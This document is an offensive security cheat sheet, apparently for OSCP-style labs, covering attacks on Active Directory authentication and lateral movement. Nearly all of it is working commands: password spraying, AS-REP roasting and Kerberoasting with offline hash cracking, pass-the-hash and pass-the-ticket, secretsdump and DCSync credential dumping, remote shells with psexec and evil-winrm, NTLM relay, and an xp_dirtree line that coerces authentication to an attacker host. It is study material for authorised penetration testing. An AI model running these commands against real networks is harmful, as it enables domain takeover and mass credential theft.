# AD Authentication Attacks & Lateral Movement

## Attack loop

```text
[valid account]
     │
     ▼
enumerate (LDAP, SMB, SPN, sessions)
     │
     ▼
attack module (roast / spray / dump / relay / RCE)
     │
     ▼
new secret (hash / ticket / password)
     │
     ▼
lateral admin on next host ──► dump again ──► Domain Admin
```

---

## Password spraying

```bash
# Prefer NetExec
nxc smb 172.16.x.0/24 -u users.txt -p 'Summer2026!' --continue-on-success
nxc smb 172.16.x.0/24 -u Administrator -H 'NTHASH' -d '.' --continue-on-success

# Through SOCKS pivot
proxychains -q nxc smb 172.16.x.0/24 -u user -p pass
```

Respect lockout policies in real engagements. In lab/exam, still spray thoughtfully.

---

## AS-REP Roasting

**Concept:** Users with **Do not require Kerberos preauthentication** allow requesting AS-REP encrypted with their key → crack offline.

```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip DC -format hashcat -outputfile asrep.txt
impacket-GetNPUsers domain.local/user:pass -request -dc-ip DC -format hashcat

hashcat -m 18200 asrep.txt wordlist.txt
```

---

## Kerberoasting

**Concept:** Request TGS for accounts with SPNs → crack offline (service account password hygiene is often weak).

```bash
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC -request -outputfile tgs.txt
# Kerberos auth
impacket-GetUserSPNs -no-pass -k domain.local/user -dc-ip DC -outputfile tgs.txt

hashcat -m 13100 tgs.txt wordlist.txt
# or
john --format=krb5tgs --wordlist=wordlist.txt tgs.txt
```

Windows / Rubeus:

```cmd
Rubeus.exe kerberoast /outfile:hashes.txt
```

> Note: older notes listing `hashcat -m 100` for Kerberoast are incorrect for modern TGS hashes; use **13100** (or mode appropriate to hash format).

---

## Pass-the-Hash (PTH)

```bash
impacket-psexec -hashes :NTHASH domain/user@TARGET
impacket-wmiexec -hashes :NTHASH domain/user@TARGET
impacket-smbexec -hashes :NTHASH domain/user@TARGET
impacket-atexec -hashes :NTHASH domain/user@TARGET
impacket-secretsdump -hashes :NTHASH domain/user@TARGET

nxc smb TARGET -u user -H NTHASH -x 'whoami'
evil-winrm -i TARGET -u user -H NTHASH
```

RDP PTH:

```bash
xfreerdp /u:user /d:DOMAIN /pth:NTHASH /v:TARGET /cert:ignore +clipboard
```

Mimikatz PTH:

```text
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:powershell.exe
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:"mstsc.exe /restrictedadmin"
```

---

## Pass-the-Ticket (PTT) & ccache handling

### Linux → use ticket

```bash
export KRB5CCNAME=/tmp/user.ccache
impacket-psexec -k -no-pass domain.local/user@host.domain.local -dc-ip DC
impacket-mssqlclient -k -no-pass domain.local/user@sql.domain.local
```

### Convert formats

```bash
# kirbi ↔ ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
# or
ticketConverter.py user.ccache user.kirbi
```

### Windows inject

```text
mimikatz # kerberos::ptt ticket.kirbi
# then
Enter-PSSession -ComputerName web01
```

### Export / import base64

```bash
# Linux extract
base64 -w 0 /tmp/krb5cc_xxx
```

```powershell
# Windows write kirbi from b64
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<base64>"))
```

**Null session / bad TGT tip:** if TGT misbehaves, try **kekeo** `tgt::delegate` (or modern alternatives) to obtain a usable ticket.

---

## Secrets dump & DCSync

### Local / remote host

```bash
impacket-secretsdump domain/user:pass@TARGET
impacket-secretsdump -hashes :NTHASH domain/user@TARGET
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Domain (DCSync-class — needs replication rights, e.g. DA)

```bash
impacket-secretsdump -just-dc domain/DA:pass@DC
impacket-secretsdump -just-dc-ntlm domain/DA@DC -hashes :NTHASH
```

Mimikatz:

```text
lsadump::dcsync /all /csv
lsadump::dcsync /user:DOMAIN\krbtgt
```

---

## Lateral movement toolkit

| Method | Tool | Notes |
|--------|------|-------|
| SMB exec | psexec, smbexec, nxc -x | Admin shares / svc creation |
| WMI | wmiexec | 135 + dynamic |
| Task | atexec | Short-lived |
| WinRM | evil-winrm, nxc winrm | 5985/5986 |
| PSRemoting | Enter-PSSession, Invoke-Command | Trusted hosts / domain |
| RDP | xfreerdp | GUI / loot |
| DCOM | dcomexec | Fallback |

```powershell
Invoke-Command -ComputerName dc02.domain.local -ScriptBlock { type C:\Users\Administrator\Desktop\proof.txt }
Enter-PSSession -ComputerName web01
```

```bash
evil-winrm -i 192.168.57.121 -u 'domain\ted' -p 'password'
evil-winrm -i 192.168.57.121 -u 'domain\ted' -H 'NTHASH'
```

---

## NTLM relay (concept)

When SMB signing is disabled and you can coerce or capture auth:

```bash
impacket-ntlmrelayx -smb2support -t smb://TARGET -c 'whoami /all' -debug
impacket-ntlmrelayx -smb2support -t TARGET -socks   # SOCKS for later use
```

MSSQL can coerce outbound SMB via:

```sql
EXEC master..xp_dirtree '\\LHOST\share';
```

Combine with responder/ntlmrelayx in lab networks. Exam usefulness varies — know the technique; do not force it if the path is simple credential reuse.

---

## SpoolSample / printer coercion (awareness)

```cmd
SpoolSample.exe TARGET CAPTURER
Rubeus.exe monitor /interval:1 /nowrap
```

Useful when you need a machine account hash/ticket in more advanced labs; OSCP may not require it, but it appears in modern AD tooling lists.

---

## Domain Admin endgame checklist

Once DA or equivalent:

```bash
# DC proof
impacket-psexec domain/Administrator@DC -hashes :HASH
# or evil-winrm / RDP

# On DC
type C:\Users\Administrator\Desktop\proof.txt
# secretsdump -just-dc for completeness in labs
```

---

## Common OSCP-style AD chain

```text
1. Web/SQL foothold on the edge host (or use provided assumed-breach user)
2. SeImpersonate → SYSTEM on the foothold
3. Enable RDP / install tools / tunnel into the internal subnet
4. Loot the foothold (hashes, history, configs) — avoid rabbit-hole ports only
5. Creds → WinRM/SSH/SMB on the next host
6. Dump LSASS / SAM → Domain Admin hash
7. PTH / ticket to DC → proof.txt
```

**Rabbit hole lesson:** A flashy open port on the next hop is often bait. Always loot the host you already own (especially PowerShell history) before inventing exotic remote exploits.

---

## Tooling migration table

| Old notes | 2026 preference |
|-----------|-----------------|
| crackmapexec | `nxc` (NetExec) |
| impacket-* scripts | still gold standard |
| mimikatz always | procdump + pypykatz / secretsdump when possible |
| manual BloodHound only | SharpHound / BH-CE when available |
